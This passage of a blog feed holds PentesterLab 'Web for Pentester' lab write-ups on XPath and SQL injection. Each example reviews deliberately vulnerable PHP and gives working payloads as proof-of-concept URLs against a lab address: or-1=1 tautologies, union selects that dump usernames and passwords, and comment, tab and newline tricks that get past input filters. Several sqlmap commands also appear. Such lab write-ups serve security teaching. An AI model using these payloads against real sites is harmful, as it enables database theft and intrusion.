</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="nv">$x</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">data</span><span class="o">&gt;&lt;</span><span class="nx">users</span><span class="o">&gt;&lt;</span><span class="nx">user</span><span class="o">&gt;&lt;</span><span class="nx">name</span><span class="o">&gt;</span><span class="nx">hacker</span><span class="o">&lt;/</span><span class="nx">name</span><span class="o">&gt;&lt;</span><span class="nx">message</span><span class="o">&gt;</span><span class="nx">Hello</span> <span class="nx">hacker</span><span class="o">&lt;/</span><span class="nx">message</span><span class="o">&gt;&lt;</span><span class="nx">password</span><span class="o">&gt;</span><span class="nx">pentesterlab</span><span class="o">&lt;/</span><span class="nx">password</span><span class="o">&gt;&lt;/</span><span class="nx">user</span><span class="o">&gt;&lt;</span><span class="nx">user</span><span class="o">&gt;&lt;</span><span class="nx">name</span><span class="o">&gt;</span><span class="nx">admin</span><span class="o">&lt;/</span><span class="nx">name</span><span class="o">&gt;&lt;</span><span class="nx">message</span><span class="o">&gt;</span><span class="nx">Hello</span> <span class="nx">admin</span><span class="o">&lt;/</span><span class="nx">message</span><span class="o">&gt;&lt;</span><span class="nx">password</span><span class="o">&gt;</span><span class="nx">s3cr3tP4ssw0rd</span><span class="o">&lt;/</span><span class="nx">password</span><span class="o">&gt;&lt;/</span><span class="nx">user</span><span class="o">&gt;&lt;/</span><span class="nx">users</span><span class="o">&gt;&lt;/</span><span class="nx">data</span><span class="o">&gt;&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$x</span><span class="p">);</span>
</span><span class='line'>  <span class="nv">$xpath</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">users</span><span class="o">/</span><span class="nx">user</span><span class="o">/</span><span class="nx">name</span><span class="p">[</span><span class="o">.=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="err">&#39;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;]</span><span class="o">/</span><span class="k">parent</span><span class="o">::*/</span><span class="nx">message</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>  <span class="nv">$res</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$xml</span><span class="o">-&gt;</span><span class="na">xpath</span><span class="p">(</span><span class="nv">$xpath</span><span class="p">));</span>
</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="k">list</span><span class="p">(</span> <span class="p">,</span><span class="nv">$node</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">echo</span> <span class="nv">$node</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, we know that variable $_GET[&lsquo;name&rsquo;] has no input validation and can be used to inject evil code.</p>

<p>In order to dump all the users' credentials, I use the payload &ldquo;<font color="red">&lsquo; or 1=1]%00</font>&rdquo; to construct the variable $xpath as follows:</p>

<p><code>users/user/name[.='' or 1=1]%00']/parent::*/message</code></p>

<p>Here <strong><em>%00</em></strong> will get rid of the following strings.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/xml/example2.php?name=' or 1=1]%00</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - SQL Injection]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection/"/>
    <updated>2015-05-22T05:53:28-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this one is focus on SQL Injection attack. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">name</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>There is no input validation on parameter <em>$_GET[&ldquo;name&rdquo;]</em>, so I can exploit it directly with the injection payload: <code>' or 1=1-- -</code>. After injection, the variable <em>$sql</em> will become <code>SELECT * FROM users where name='' or 1=1-- -'</code> which will return all the entries in table users.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example1.php?name=root' or 1=1-- -</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example1.php?name=root" --dbs --banner</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span> <span class="o">/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">NO</span> <span class="nx">SPACE</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">name</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, we know that the developer filtered SPACE in user input. However we can use comment /**/ or TAB/HT (%09, URL encoded) to bypass space filter.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example2.php?name=root'%09and%09'1'='1</code></p>

<p><code>http://10.10.10.129/sqli/example2.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2</code></p>

<p><img class="left" src="/downloads/webforpentester_sqli/1.png"></p>

<p>SQLMAP exploit:
In sqlmap, we can set parameter &ldquo;<em><font color="red">&ndash;tamper=space2comment</font></em>&rdquo; to replace space with comment.</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example2.php?name=root" --dbs --tamper=space2comment</code></p>

<h2>Example 3</h2>

<p>Code review:
<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">\s</span><span class="o">+/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">NO</span> <span class="nx">SPACE</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">name</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use <a href="http://php.net/manual/en/regexp.reference.escape.php">PCRE regex (<strong><em>\s+</em></strong>)</a> to filter one or more sequential spaces (which including TAB/HT). However, I still can use comment <code>/**/</code> to bypass this filter.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example3.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example3.php?name=root" --dbs --tamper=space2comment</code></p>

<h2>Example 4</h2>

<p>Code review:
<figure class='code'><figcaption><span>example4.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$sql</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span><span class="o">.=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;])</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the developer use function &ldquo;<em><a href="http://php.net/manual/en/function.mysql-real-escape-string.php">mysql_real_escape_string</a></em>&rdquo; to prevent SQL injection from the following characters <code>\x00, \n, \r, \, ', " and \x1a</code></p>

<p>However, in this case, &lsquo;id&rsquo; is used as integrate number which is not quoted by <code>'</code>, it is still vulnerable to SQL injection.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example4.php?id=2 or 1=1</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example4.php?id=2" --dbs</code></p>

<h2>Example 5</h2>

<p>Code review:
<figure class='code'><figcaption><span>example5.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/^</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">INTEGER</span> <span class="nx">REQUIRED</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span> <span class="p">;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>&ldquo;I guess the beginning of the story &hellip;&hellip; But I didn&rsquo;t expect the end of the story.&rdquo; &ndash; Shakespeare</p>

<p>The incorrect regular expression failed to protect SQL injection, it only make sure the input of <em><font color="red">id</font></em> is start from integrate number but it could be followed by everything.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example5.php?id=2 or 1=1</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example5.php?id=2" --dbs</code></p>

<h2>Example 6</h2>

<p>Code review:
<figure class='code'><figcaption><span>example6.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span><span class="err">$</span><span class="o">/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">INTEGER</span> <span class="nx">REQUIRED</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span> <span class="p">;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The incorrect regular expression failed to protect SQL injection, it only make sure the input of <em><font color="red">id</font></em> is end by integrate number but the injection still happened.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example6.php?id=2 or 1=1</code></p>

<p>SQLMAP exploit:</p>

<p><code>sqlmap -u "http://10.10.10.129/sqli/example6.php?id=2" --dbs</code></p>

<h2>Example 7</h2>

<p>Code review:
<figure class='code'><figcaption><span>example7.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/^-?</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span><span class="err">$</span><span class="o">/</span><span class="nx">m</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">INTEGER</span> <span class="nx">REQUIRED</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;];</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span><span class='line'><span class="o">...</span> <span class="o">...</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the beginning and the end of the string are correctly checked but due to the regular expression contains the <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">PRCE_MULTILINE modifier (m)</a>, it makes the regex filter can be bypassed only match one line, does not matter the start or the end. So the SQL injection still happened in following ways.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/sqli/example7.php?id=2%0a or 1=1</code></p>

